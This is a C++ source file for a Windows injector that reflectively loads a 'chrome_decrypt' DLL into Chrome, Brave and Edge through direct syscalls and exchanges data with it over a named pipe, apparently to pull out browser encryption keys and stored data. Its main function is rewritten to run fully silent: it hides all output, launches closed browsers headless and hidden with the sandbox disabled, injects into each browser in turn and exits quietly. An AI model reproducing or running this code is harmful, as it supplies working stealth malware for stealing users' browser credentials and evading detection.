// chrome_inject.cpp
// v0.11.0 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <tlhelp32.h>
#include <fstream>
#include <iostream>
#include <string>
#include <string_view>
#include <vector>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <cctype>
#include <cwctype>
#include <algorithm>
#include <optional>
#include <map>
#include "syscalls.h"
#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

#ifndef IMAGE_FILE_MACHINE_ARM64
#define IMAGE_FILE_MACHINE_ARM64 0xAA64
#endif

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
constexpr DWORD BROWSER_INIT_WAIT_MS = 3000;
constexpr DWORD INJECTOR_REMOTE_THREAD_WAIT_MS = 15000;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;
static bool verbose = false;
static std::wstring g_customOutputPathArg;

std::string WStringToUtf8(std::wstring_view w_sv)
{
    if (w_sv.empty())
        return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
    if (size_needed == 0)
    {
        return "";
    }
    std::string utf8_str(size_needed, '\0');
    if (WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr) == 0)
    {
        return "";
    }
    return utf8_str;
}

std::wstring GenerateUniquePipeName()
{
    UUID uuid;
    UuidCreate(&uuid);
    wchar_t *uuidStrRaw = nullptr;
    if (UuidToStringW(&uuid, (RPC_WSTR *)&uuidStrRaw) != RPC_S_OK)
    {
        return L"\\\\.\\pipe\\ChromeDecryptIPC_FallbackErrorName";
    }
    std::wstring pipeName = L"\\\\.\\pipe\\ChromeDecryptIPC_";
    pipeName += uuidStrRaw;
    RpcStringFreeW((RPC_WSTR *)&uuidStrRaw);
    return pipeName;
}

std::string PtrToHexStr(const void *ptr)
{
    std::ostringstream oss;
    oss << "0x" << std::hex << reinterpret_cast<uintptr_t>(ptr);
    return oss.str();
}

void print_hex_ptr(std::ostringstream &oss, const void *ptr)
{
    oss << "0x" << std::hex << reinterpret_cast<uintptr_t>(ptr);
}

std::string NtStatusToString(NTSTATUS status)
{
    std::ostringstream oss;
    oss << "0x" << std::hex << status;
    return oss.str();
}

inline void debug(const std::string &msg)
{
    if (!verbose)
        return;
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN);
    std::cout << "[#] " << msg << std::endl;
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

struct HandleGuard
{
    HANDLE h_;
    std::string context_msg;

    explicit HandleGuard(HANDLE h = nullptr, const std::string &context = "")
        : h_((h == INVALID_HANDLE_VALUE) ? nullptr : h), context_msg(context)
    {
        if (h_ && verbose)
        {
            std::ostringstream oss;
            oss << "HandleGuard: acquired handle ";
            print_hex_ptr(oss, h_);
            if (!context_msg.empty())
                oss << " (" << context_msg << ")";
            debug(oss.str());
        }
    }
    ~HandleGuard()
    {
        if (h_)
        {
            if (verbose)
            {
                std::ostringstream oss;
                oss << "HandleGuard: closing handle ";
                print_hex_ptr(oss, h_);
                if (!context_msg.empty())
                    oss << " (" << context_msg << ")";
                debug(oss.str());
            }
            CloseHandle(h_);
        }
    }
    HANDLE get() const { return h_; }
    void reset(HANDLE h = nullptr)
    {
        if (h_)
            CloseHandle(h_);
        h_ = (h == INVALID_HANDLE_VALUE) ? nullptr : h;
        if (h_ && verbose)
        {
            std::ostringstream oss;
            oss << "HandleGuard: reset to handle ";
            print_hex_ptr(oss, h_);
            debug(oss.str());
        }
    }
    explicit operator bool() const { return h_ != nullptr; }
    HandleGuard(const HandleGuard &) = delete;
    HandleGuard &operator=(const HandleGuard &) = delete;
    HandleGuard(HandleGuard &&other) noexcept : h_(other.h_), context_msg(std::move(other.context_msg)) { other.h_ = nullptr; }
    HandleGuard &operator=(HandleGuard &&other) noexcept
    {
        if (this != &other)
        {
            if (h_)
                CloseHandle(h_);
            h_ = other.h_;
            context_msg = std::move(other.context_msg);
            other.h_ = nullptr;
        }
        return *this;
    }
};


static const char *ArchName(USHORT m)
{
    switch (m)
    {
    case IMAGE_FILE_MACHINE_I386:
        return "x86";
    case IMAGE_FILE_MACHINE_AMD64:
        return "x64";
    case IMAGE_FILE_MACHINE_ARM64:
        return "ARM64";
    default:
        return "Unknown";
    }
}
constexpr USHORT MyArch =
#if defined(_M_IX86)
    IMAGE_FILE_MACHINE_I386
#elif defined(_M_X64)
    IMAGE_FILE_MACHINE_AMD64
#elif defined(_M_ARM64)
    IMAGE_FILE_MACHINE_ARM64
#else
    IMAGE_FILE_MACHINE_UNKNOWN
#endif
    ;

bool GetProcessArchitecture(HANDLE hProc, USHORT &arch)
{
    auto fnIsWow64Process2 = (decltype(&IsWow64Process2))GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process2");
    if (fnIsWow64Process2)
    {
        USHORT processMachine = IMAGE_FILE_MACHINE_UNKNOWN, nativeMachine = IMAGE_FILE_MACHINE_UNKNOWN;
        if (!fnIsWow64Process2(hProc, &processMachine, &nativeMachine))
        {
            debug("IsWow64Process2 call failed. Error: " + std::to_string(GetLastError()));
            return false;
        }
        arch = (processMachine == IMAGE_FILE_MACHINE_UNKNOWN) ? nativeMachine : processMachine;
        debug(std::string("IsWow64Process2: processMachine=") + ArchName(processMachine) + ", nativeMachine=" + ArchName(nativeMachine) + ", effectiveArch=" + ArchName(arch));
        return true;
    }
    BOOL isWow64 = FALSE;
    if (!IsWow64Process(hProc, &isWow64))
    {
        debug("IsWow64Process call failed. Error: " + std::to_string(GetLastError()));
        return false;
    }
#if defined(_M_X64)
    arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_AMD64;
#elif defined(_M_ARM64)
    arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_ARM64;
#elif defined(_M_IX86)
    arch = IMAGE_FILE_MACHINE_I386;
    if (isWow64)
    {
        debug("Warning: 32-bit injector running on a 64-bit OS (or WOW64 detected unexpectedly). Target is likely x64 if IsWow64Process is true.");
    }
#else
    arch = IMAGE_FILE_MACHINE_UNKNOWN;
    return false;
#endif
    debug(std::string("IsWow64Process fallback: isWow64=") + (isWow64 ? "TRUE" : "FALSE") + ", effectiveArch=" + ArchName(arch));
    return true;
}

bool CheckArchMatch(HANDLE hProc)
{
    USHORT targetArch = IMAGE_FILE_MACHINE_UNKNOWN;
    if (!GetProcessArchitecture(hProc, targetArch))
    {
        debug("[-] Failed to determine target architecture");
        return false;
    }
    if (targetArch != MyArch)
    {
        debug(std::string("[-] Architecture mismatch: Injector is ") + ArchName(MyArch) + " but target is " + ArchName(targetArch));
        return false;
    }
    debug("Architecture match: Injector=" + std::string(ArchName(MyArch)) + ", Target=" + std::string(ArchName(targetArch)));
    return true;
}

void CleanupPreviousRun()
{
    debug("CleanupPreviousRun: attempting to remove temp files");
    fs::path tempDir;
    try
    {
        tempDir = fs::temp_directory_path();
    }
    catch (const fs::filesystem_error &e)
    {
        debug("CleanupPreviousRun: fs::temp_directory_path() failed: " + std::string(e.what()) + ". Skipping cleanup of some temp files.");
        return;
    }

    const char *files_to_delete[] = {"chrome_decrypt.log", "chrome_appbound_key.txt"};
    for (const char *fname : files_to_delete)
    {
        fs::path file_path = tempDir / fname;
        std::error_code ec;
        if (fs::exists(file_path))
        {
            debug("Deleting " + file_path.u8string());
            if (!fs::remove(file_path, ec))
            {
                debug("Failed to delete temp file: " + file_path.u8string() + ". Error: " + ec.message());
            }
        }
    }
}

std::optional<DWORD> GetProcessIdByName(const std::wstring &procName)
{
    debug("GetProcessIdByName: snapshotting processes for " + WStringToUtf8(procName));
    HandleGuard snap(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0), "CreateToolhelp32Snapshot");
    if (!snap)
    {
        debug("GetProcessIdByName: CreateToolhelp32Snapshot failed. Error: " + std::to_string(GetLastError()));
        return std::nullopt;
    }
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snap.get(), &entry))
    {
        do
        {
            if (procName == entry.szExeFile)
            {
                debug("Found process " + WStringToUtf8(procName) + " PID=" + std::to_string(entry.th32ProcessID));
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snap.get(), &entry));
    }
    else
    {
        if (GetLastError() != ERROR_NO_MORE_FILES)
            debug("GetProcessIdByName: Process32FirstW failed. Error: " + std::to_string(GetLastError()));
    }
    debug("GetProcessIdByName: Process " + WStringToUtf8(procName) + " not found.");
    return std::nullopt;
}

std::string GetPayloadDllPathUtf8()
{
    wchar_t currentExePathRaw[MAX_PATH];
    DWORD len = GetModuleFileNameW(NULL, currentExePathRaw, MAX_PATH);
    if (len == 0 || (len == MAX_PATH && GetLastError() == ERROR_INSUFFICIENT_BUFFER))
    {
        debug("GetPayloadDllPathUtf8: GetModuleFileNameW failed. Error: " + std::to_string(GetLastError()));
        return "";
    }
    fs::path dllPathFs = fs::path(currentExePathRaw).parent_path() / L"chrome_decrypt.dll";
    std::string dllPathStr = dllPathFs.u8string();
    debug("GetPayloadDllPathUtf8: DLL path determined as: " + dllPathStr);
    return dllPathStr;
}

DWORD RvaToOffset_Injector(DWORD dwRva, PIMAGE_NT_HEADERS64 pNtHeaders, LPVOID lpFileBase)
{
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    if (pNtHeaders->FileHeader.NumberOfSections == 0)
    {
        if (dwRva < pNtHeaders->OptionalHeader.SizeOfHeaders)
            return dwRva;
        else
            return 0;
    }
    if (dwRva < pSectionHeader[0].VirtualAddress)
    {
        if (dwRva < pNtHeaders->OptionalHeader.SizeOfHeaders)
            return dwRva;
        else
            return 0;
    }
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (dwRva >= pSectionHeader[i].VirtualAddress &&
            dwRva < (pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData))
        {
            return (pSectionHeader[i].PointerToRawData + (dwRva - pSectionHeader[i].VirtualAddress));
        }
    }
    return 0;
}

DWORD GetReflectiveLoaderFileOffset(LPVOID lpFileBuffer, USHORT expectedMachine)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        debug("RDI Offset: Invalid DOS signature.");
        return 0;
    }
    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)lpFileBuffer + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        debug("RDI Offset: Invalid NT signature.");
        return 0;
    }
    if (pNtHeaders->FileHeader.Machine != expectedMachine)
    {
        std::ostringstream oss_mach;
        oss_mach << "RDI Offset: DLL is not for target machine. Expected: 0x" << std::hex << expectedMachine << ", Got: 0x" << pNtHeaders->FileHeader.Machine;
        debug(oss_mach.str());
        return 0;
    }
    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
        debug("RDI Offset: DLL is not PE32+.");
        return 0;
    }

    PIMAGE_DATA_DIRECTORY pExportDataDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (pExportDataDir->VirtualAddress == 0 || pExportDataDir->Size == 0)
    {
        debug("RDI Offset: No export directory found.");
        return 0;
    }

    DWORD exportDirFileOffset = RvaToOffset_Injector(pExportDataDir->VirtualAddress, pNtHeaders, lpFileBuffer);
    if (exportDirFileOffset == 0 && pExportDataDir->VirtualAddress != 0)
    {
        debug("RDI Offset: Could not convert export directory RVA to offset.");
        return 0;
    }
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)lpFileBuffer + exportDirFileOffset);

    if (pExportDir->AddressOfNames == 0 || pExportDir->AddressOfNameOrdinals == 0 || pExportDir->AddressOfFunctions == 0)
    {
        debug("RDI Offset: Export directory contains null RVA(s) for names, ordinals, or functions.");
        return 0;
    }

    DWORD namesOffset = RvaToOffset_Injector(pExportDir->AddressOfNames, pNtHeaders, lpFileBuffer);
    DWORD ordinalsOffset = RvaToOffset_Injector(pExportDir->AddressOfNameOrdinals, pNtHeaders, lpFileBuffer);
    DWORD functionsOffset = RvaToOffset_Injector(pExportDir->AddressOfFunctions, pNtHeaders, lpFileBuffer);

    if ((namesOffset == 0 && pExportDir->AddressOfNames != 0) ||
        (ordinalsOffset == 0 && pExportDir->AddressOfNameOrdinals != 0) ||
        (functionsOffset == 0 && pExportDir->AddressOfFunctions != 0))
    {
        debug("RDI Offset: Failed to convert one or more export RVAs to offset.");
        return 0;
    }

    DWORD *pNamesRva = (DWORD *)((ULONG_PTR)lpFileBuffer + namesOffset);
    WORD *pOrdinals = (WORD *)((ULONG_PTR)lpFileBuffer + ordinalsOffset);
    DWORD *pAddressesRva = (DWORD *)((ULONG_PTR)lpFileBuffer + functionsOffset);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++)
    {
        if (pNamesRva[i] == 0)
            continue;
        DWORD funcNameFileOffset = RvaToOffset_Injector(pNamesRva[i], pNtHeaders, lpFileBuffer);
        if (funcNameFileOffset == 0 && pNamesRva[i] != 0)
            continue;
        char *funcName = (char *)((ULONG_PTR)lpFileBuffer + funcNameFileOffset);

        if (strcmp(funcName, "ReflectiveLoader") == 0)
        {
            if (pOrdinals[i] >= pExportDir->NumberOfFunctions)
                return 0;
            if (pAddressesRva[pOrdinals[i]] == 0)
                return 0;
            DWORD functionFileOffset = RvaToOffset_Injector(pAddressesRva[pOrdinals[i]], pNtHeaders, lpFileBuffer);
            if (functionFileOffset == 0 && pAddressesRva[pOrdinals[i]] != 0)
                return 0;
            return functionFileOffset;
        }
    }
    debug("RDI Offset: ReflectiveLoader export not found.");
    return 0;
}

bool InjectWithReflectiveLoader(HANDLE proc, const std::string &dllPathUtf8, USHORT targetArch, LPVOID lpDllParameter)
{
    debug("InjectWithReflectiveLoader: begin for DLL: " + dllPathUtf8 + ", Param: " + PtrToHexStr(lpDllParameter));

    std::ifstream dllFile(dllPathUtf8, std::ios::binary | std::ios::ate);
    if (!dllFile.is_open())
    {
        debug("RDI: Failed to open DLL file: " + dllPathUtf8);
        return false;
    }
    std::streamsize fileSizeStream = dllFile.tellg();
    dllFile.seekg(0, std::ios::beg);
    std::vector<BYTE> dllBuffer(static_cast<size_t>(fileSizeStream));
    if (!dllFile.read(reinterpret_cast<char *>(dllBuffer.data()), fileSizeStream))
    {
        debug("RDI: Failed to read DLL file into buffer.");
        return false;
    }
    dllFile.close();
    debug("RDI: DLL read into local buffer. Size: " + std::to_string(fileSizeStream) + " bytes.");

    DWORD reflectiveLoaderOffset = GetReflectiveLoaderFileOffset(dllBuffer.data(), targetArch);
    if (reflectiveLoaderOffset == 0)
    {
        debug("RDI: GetReflectiveLoaderFileOffset failed.");
        return false;
    }
    std::ostringstream oss_rlo;
    oss_rlo << "RDI: ReflectiveLoader file offset: 0x" << std::hex << reflectiveLoaderOffset;
    debug(oss_rlo.str());

    LPVOID remoteMem = nullptr;
    SIZE_T regionSize = dllBuffer.size();
    NTSTATUS status_alloc = g_syscall_stubs.NtAllocateVirtualMemory(
        proc,
        &remoteMem,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(status_alloc) || !remoteMem)
    {
        debug("RDI: NtAllocateVirtualMemory failed. Status: " + NtStatusToString(status_alloc));
        return false;
    }
    std::ostringstream oss_rem;
    print_hex_ptr(oss_rem, remoteMem);
    debug("RDI: Memory allocated in target at " + oss_rem.str() + " (Size: " + std::to_string(dllBuffer.size()) + " bytes)");

    SIZE_T bytesWritten = 0;
    NTSTATUS status_write = g_syscall_stubs.NtWriteVirtualMemory(
        proc,
        remoteMem,
        dllBuffer.data(),
        dllBuffer.size(),
        &bytesWritten);

    if (!NT_SUCCESS(status_write) || bytesWritten != dllBuffer.size())
    {
        debug("RDI: NtWriteVirtualMemory failed. Status: " + NtStatusToString(status_write) +
              ", Bytes written: " + std::to_string(bytesWritten));

        SIZE_T sizeToFree = 0;
        PVOID baseAddressToFree = remoteMem;
        g_syscall_stubs.NtFreeVirtualMemory(proc, &baseAddressToFree, &sizeToFree, MEM_RELEASE);
        return false;
    }
    debug("RDI: DLL written to target memory.");

    ULONG_PTR remoteLoaderAddr = reinterpret_cast<ULONG_PTR>(remoteMem) + reflectiveLoaderOffset;
    std::ostringstream oss_rla;
    oss_rla << "RDI: Calculated remote ReflectiveLoader address: 0x" << std::hex << remoteLoaderAddr;
    debug(oss_rla.str());

    HANDLE hRemoteThread = nullptr;
    NTSTATUS status_thread = g_syscall_stubs.NtCreateThreadEx(
        &hRemoteThread,
        THREAD_ALL_ACCESS,
        nullptr,
        proc,
        (LPTHREAD_START_ROUTINE)remoteLoaderAddr,
        lpDllParameter,
        0,
        0,
        0,
        0,
        nullptr);

    HandleGuard th(nullptr, "RemoteReflectiveLoaderThread_Syscall");
    if (!NT_SUCCESS(status_thread) || !hRemoteThread)
    {
        debug("RDI: NtCreateThreadEx for ReflectiveLoader failed. Status: " + NtStatusToString(status_thread));
        SIZE_T sizeToFree = 0;
        PVOID baseAddressToFree = remoteMem;
        g_syscall_stubs.NtFreeVirtualMemory(proc, &baseAddressToFree, &sizeToFree, MEM_RELEASE);
        return false;
    }
    th.reset(hRemoteThread);

    debug("RDI: Waiting for remote ReflectiveLoader thread to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
    DWORD wait_res = WaitForSingleObject(th.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);

    DWORD exitCode = 0;
    GetExitCodeThread(th.get(), &exitCode);
    std::ostringstream oss_exit;
    oss_exit << "RDI: Remote thread exit code: 0x" << std::hex << exitCode;
    debug(oss_exit.str());

    if (wait_res == WAIT_TIMEOUT)
        debug("RDI: Remote ReflectiveLoader thread timed out.");
    else if (wait_res == WAIT_OBJECT_0)
        debug("RDI: Remote ReflectiveLoader thread finished.");
    else
        debug("RDI: WaitForSingleObject on ReflectiveLoader thread failed. Error: " + std::to_string(GetLastError()));

    debug("InjectWithReflectiveLoader: done");
    return (wait_res == WAIT_OBJECT_0 && exitCode != 0);
}

struct BrowserDetails
{
    std::wstring processName;
    std::wstring defaultExePath;
};
const std::map<std::wstring, BrowserDetails> browserConfigMap = {
    {L"chrome", {L"chrome.exe", L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}},
    {L"brave", {L"brave.exe", L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
    {L"edge", {L"msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}}};

bool StartBrowserAndWait(const std::wstring &exePath, DWORD &outPid)
{
    debug("StartBrowserAndWait: attempting to launch: " + WStringToUtf8(exePath));
    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    if (!CreateProcessW(exePath.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi))
    {
        debug("CreateProcessW failed for " + WStringToUtf8(exePath) + ". Error: " + std::to_string(GetLastError()));
        return false;
    }
    HandleGuard processHandle(pi.hProcess, "BrowserProcessHandle");
    HandleGuard threadHandle(pi.hThread, "BrowserMainThreadHandle");
    debug("Waiting " + std::to_string(BROWSER_INIT_WAIT_MS / 1000) + "s for browser to initialize...");
    Sleep(BROWSER_INIT_WAIT_MS);
    outPid = pi.dwProcessId;
    debug("Browser started PID=" + std::to_string(outPid));
    return true;
}

void PrintUsage()
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::wcout << L"Usage:\n"
               << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
               << L"Options:\n"
               << L"  --start-browser|-s       Auto-launch browser if not running\n"
               << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
               << L"  --verbose|-v             Enable verbose debug output from the injector\n"
               << L"  --help|-h                Show this help message\n";
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

int wmain(int /*argc*/, wchar_t ** /*argv*/)
{
    // No UI, no output, no banner, no argument parsing.
    // Always run in silent mode.
    verbose = false;

    // Initialize syscalls (no debug output)
    if (!InitializeSyscalls(false))
    {
        ExitProcess(1);
    }

    // List of browsers to process
    const std::vector<std::wstring> browserTypes = {L"chrome", L"brave", L"edge"};

    // Output base path: ./output/
    fs::path exeDir;
    try {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        exeDir = fs::path(exePath).parent_path();
    } catch (...) {
        ExitProcess(1);
    }
    fs::path outputBase = exeDir / "output";

    // For each browser, inject and extract
    for (const auto& browserTypeArg : browserTypes)
    {
        auto browserIt = browserConfigMap.find(browserTypeArg);
        if (browserIt == browserConfigMap.end())
            continue;
        const BrowserDetails& currentBrowserInfo = browserIt->second;

        // Check if process is running
        DWORD targetPid = 0;
        if (auto optPid = GetProcessIdByName(currentBrowserInfo.processName))
            targetPid = *optPid;

        // If not running, launch hidden/headless
        if (targetPid == 0)
        {
            STARTUPINFOW si{};
            PROCESS_INFORMATION pi{};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            std::wstring cmdLine = L"\"" + currentBrowserInfo.defaultExePath + L"\" --headless --disable-gpu --no-sandbox --disable-software-rasterizer";
            if (!CreateProcessW(currentBrowserInfo.defaultExePath.c_str(),
                                &cmdLine[0], nullptr, nullptr, FALSE,
                                CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
            {
                continue;
            }
            // Wait for browser to initialize
            Sleep(BROWSER_INIT_WAIT_MS);
            targetPid = pi.dwProcessId;
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        if (targetPid == 0)
            continue;

        // Open process
        HandleGuard targetProcessHandle(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid));
        if (!targetProcessHandle)
            continue;

        USHORT currentTargetArch = IMAGE_FILE_MACHINE_UNKNOWN;
        if (!GetProcessArchitecture(targetProcessHandle.get(), currentTargetArch))
            continue;
        if (!CheckArchMatch(targetProcessHandle.get()))
            continue;

        // Prepare named pipe for IPC
        std::wstring ipcPipeNameW = GenerateUniquePipeName();
        std::string ipcPipeNameA = WStringToUtf8(ipcPipeNameW);

        HandleGuard namedPipeHandle(CreateNamedPipeW(
            ipcPipeNameW.c_str(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1, 4096, 4096, 0, nullptr));

        if (!namedPipeHandle)
            continue;

        // Allocate pipe name in target
        LPVOID remotePipeNameAddr = nullptr;
        SIZE_T pipeNameSizeInBytes = (ipcPipeNameW.length() + 1) * sizeof(wchar_t);
        NTSTATUS status_alloc_pipename = g_syscall_stubs.NtAllocateVirtualMemory(
            targetProcessHandle.get(), &remotePipeNameAddr, 0, &pipeNameSizeInBytes,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status_alloc_pipename) || !remotePipeNameAddr)
            continue;

        SIZE_T bytesWrittenPipeName = 0;
        NTSTATUS status_write_pipename = g_syscall_stubs.NtWriteVirtualMemory(
            targetProcessHandle.get(), remotePipeNameAddr, (PVOID)ipcPipeNameW.c_str(),
            pipeNameSizeInBytes, &bytesWrittenPipeName);
        if (!NT_SUCCESS(status_write_pipename) || bytesWrittenPipeName != pipeNameSizeInBytes)
        {
            SIZE_T sizeToFree = 0;
            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
            continue;
        }

        // DLL path
        std::string dllPathUtf8 = GetPayloadDllPathUtf8();
        if (dllPathUtf8.empty() || !fs::exists(dllPathUtf8))
        {
            SIZE_T stf = 0;
            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &stf, MEM_RELEASE);
            continue;
        }

        // Inject DLL
        if (!InjectWithReflectiveLoader(targetProcessHandle.get(), dllPathUtf8, currentTargetArch, remotePipeNameAddr))
        {
            SIZE_T sizeToFree = 0;
            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
            continue;
        }

        // Wait for DLL to connect to pipe
        if (!ConnectNamedPipe(namedPipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
        {
            SIZE_T sizeToFree = 0;
            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
            continue;
        }

        // Send "VERBOSE_FALSE" (always silent)
        std::string verboseStatusMsg = "VERBOSE_FALSE";
        DWORD bytesWrittenVerboseStatus = 0;
        WriteFile(namedPipeHandle.get(), verboseStatusMsg.c_str(), verboseStatusMsg.length() + 1, &bytesWrittenVerboseStatus, nullptr);

        // Send output path (./output/<BrowserName>/)
        fs::path browserOutputPath = outputBase / WStringToUtf8(browserTypeArg);
        std::error_code ec_dir;
        if (!fs::exists(browserOutputPath))
            fs::create_directories(browserOutputPath, ec_dir);
        std::string outputPathUtf8_pipe = browserOutputPath.u8string();
        DWORD bytesWrittenToPipe = 0;
        WriteFile(namedPipeHandle.get(), outputPathUtf8_pipe.c_str(), outputPathUtf8_pipe.length() + 1, &bytesWrittenToPipe, nullptr);

        // Wait for DLL completion signal
        std::string accumulatedPipeData;
        char pipeBuffer[4096];
        DWORD bytesReadFromPipe = 0;
        const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        DWORD startTime = GetTickCount();
        bool dllCompleted = false;
        while (true)
        {
            if (GetTickCount() - startTime > DLL_COMPLETION_TIMEOUT_MS)
                break;
            DWORD bytesAvailable = 0;
            if (!PeekNamedPipe(namedPipeHandle.get(), nullptr, 0, nullptr, &bytesAvailable, nullptr))
                break;
            if (bytesAvailable == 0)
            {
                Sleep(100);
                continue;
            }
            if (ReadFile(namedPipeHandle.get(), pipeBuffer, sizeof(pipeBuffer) - 1, &bytesReadFromPipe, nullptr) && bytesReadFromPipe > 0)
            {
                pipeBuffer[bytesReadFromPipe] = '\0';
                accumulatedPipeData.append(pipeBuffer, bytesReadFromPipe);
                size_t messageStartPos = 0;
                size_t nullTerminatorPos;
                while ((nullTerminatorPos = accumulatedPipeData.find('\0', messageStartPos)) != std::string::npos)
                {
                    std::string message = accumulatedPipeData.substr(messageStartPos, nullTerminatorPos - messageStartPos);
                    messageStartPos = nullTerminatorPos + 1;
                    if (message == dllCompletionSignal)
                    {
                        dllCompleted = true;
                        break;
                    }
                }
                if (dllCompleted)
                    break;
                accumulatedPipeData.erase(0, messageStartPos);
            }
            else
            {
                break;
            }
        }

        // Free remote pipe name memory
        if (remotePipeNameAddr)
        {
            SIZE_T sizeToFree = 0;
            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
        }
    }

    // Exit silently
    ExitProcess(0);
    return 0;
}
